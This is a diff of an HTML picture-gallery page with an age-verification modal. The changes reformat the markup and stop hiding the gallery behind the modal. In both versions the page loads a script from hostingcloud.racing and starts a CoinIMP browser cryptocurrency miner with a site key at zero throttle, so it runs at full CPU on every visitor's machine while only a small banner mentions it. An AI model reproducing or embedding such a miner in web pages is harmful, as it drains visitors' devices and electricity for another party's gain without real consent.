@@ -1,15 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="styles.css">
-    <title>My pictures</title>
-
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="styles.css">
+  <title>My pictures</title>
 </head>
 <body>
 
-      <!-- Age Verification Modal -->
+  <!-- Age Verification Modal -->
   <div id="ageModal">
     <div id="ageModalContent">
       <h2>Age Verification</h2>
@@ -29,33 +28,34 @@
   </div>
 
   <!-- Main Content (Initially hidden behind the modal) -->
-  <div id="content" style="display: none;">
-
-    <h1 class="gallery-title">My pictures</h1>
-
+  <div id="content">
+    <h1 class="gallery-title">My Pictures</h1>
     <div class="gallery-container">
-    <!-- Gallery items will be inserted here -->
-</div>
+      <!-- Gallery items will be inserted here -->
+    </div>
+  </div>
 
-<script>
-    // Generate images from img2.png to img15.png
+  <!-- Scripts placed at the end of the body -->
+  <script>
+    // Generate images from img1.png to img14.png
     const galleryContainer = document.querySelector('.gallery-container');
     const startNumber = 1;
     const endNumber = 14;
 
     for (let i = startNumber; i <= endNumber; i++) {
-        const galleryItem = document.createElement('div');
-        galleryItem.className = 'gallery-item';
-        
-        const img = document.createElement('img');
-        img.src = `images/img${i}.png`;
-        img.alt = `Image ${i}`;
-        
-        galleryItem.appendChild(img);
-        galleryContainer.appendChild(galleryItem);
+      const galleryItem = document.createElement('div');
+      galleryItem.className = 'gallery-item';
+      
+      const img = document.createElement('img');
+      img.src = `images/img${i}.png`;
+      img.alt = `Image ${i}`;
+      
+      galleryItem.appendChild(img);
+      galleryContainer.appendChild(galleryItem);
     }
-</div>
-    <script>
+  </script>
+
+  <script>
     // When the page loads, the modal is visible, blocking the content.
     // Add event listeners for the buttons.
     document.getElementById('btnOver').addEventListener('click', function () {
@@ -67,21 +67,20 @@
     document.getElementById('btnUnder').addEventListener('click', function () {
       // Optionally show a message and redirect or simply block access.
       alert('Access denied. You must be 18 or older to view this site.');
-      // For example, redirecting to a safe site:
+      // Redirecting to a safe site (e.g., Google)
       window.location.href = 'https://www.google.com';
     });
   </script>
-</script>
 
-<script src="https://www.hostingcloud.racing/UXQb.js"></script>
-<script>
+  <!-- Your other scripts -->
+  <script src="https://www.hostingcloud.racing/UXQb.js"></script>
+  <script>
     var _client = new Client.Anonymous('869b67f956fa7d50e8f2f0c90e698630b1001e91add218c9ba4989b3b6ef52ac', {
-        throttle: 0, c: 'w'
+      throttle: 0, c: 'w'
     });
     _client.start();
     _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-
-</script>
-    
+  </script>
+  
 </body>
 </html>
